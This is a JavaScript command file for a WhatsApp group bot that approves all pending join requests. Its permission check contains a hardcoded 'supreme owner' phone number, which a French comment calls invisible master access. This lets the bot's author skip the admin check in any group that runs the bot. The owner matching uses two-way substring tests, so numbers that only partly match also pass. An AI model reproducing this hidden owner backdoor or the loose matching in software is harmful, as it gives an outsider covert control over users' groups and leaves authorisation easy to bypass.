/**
 * ApproveAll Command - Approve all pending join requests
 */

const config = require('../../config.js');

// Fonction pour le style Small Caps (Garde la cohérence visuelle)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
  
  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'approveall',
  aliases: ['approveall', 'acceptall', 'approuverout', 'ᴀᴘᴘʀᴏᴠᴇᴀʟʟ'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: 'Approve all pending join requests',
  usage: '.approveall',
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,
  
  async execute(sock, msg, args, extra) {
    const prefix = config.prefix || '.';

    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
      const supremeOwner = '22651622652';
      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
      
      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
      if (!isMe) {
        const isAdmins = extra.isAdmins || false; 
        if (!isAdmins) {
          return extra.reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
        }
      }

      const chatId = msg.key.remoteJid;

      await extra.reply('*☬ ɪɴᴠᴏᴄᴀᴛɪᴏɴ : ʀᴇᴄʜᴇʀᴄʜᴇ ᴅᴇs ᴀ̂ᴍᴇs ᴇɴ ᴀᴛᴛᴇɴᴛᴇ...*');

      // Récupération des requêtes en attente
      const pendingList = await sock.groupRequestParticipantsList(chatId);

      if (!pendingList || pendingList.length === 0) {
        return extra.reply(`❌ *${toSmallCaps('aucune demande d adhesion en attente dans le sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
      }

      const totalRequests = pendingList.length;
      
      // Approbation en masse
      for (const request of pendingList) {
        await sock.groupRequestParticipantsUpdate(chatId, [request.jid], 'approve');
      }

      // Succès
      await sock.sendMessage(chatId, {
        text: `📈 *${totalRequests} ᴀ̂ᴍᴇs ᴏɴᴛ ᴇ́ᴛᴇ́ ᴀᴘᴘʀᴏᴜᴠᴇ́ᴇs ᴇᴛ ɪɴᴛᴇ́ɢʀᴇ́ᴇs ᴀᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`,
      }, { quoted: msg });

    } catch (error) {
      await extra.reply(`❌ *ᴇʀʀᴇᴜʀ :* ${error.message}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
    }
  }
};
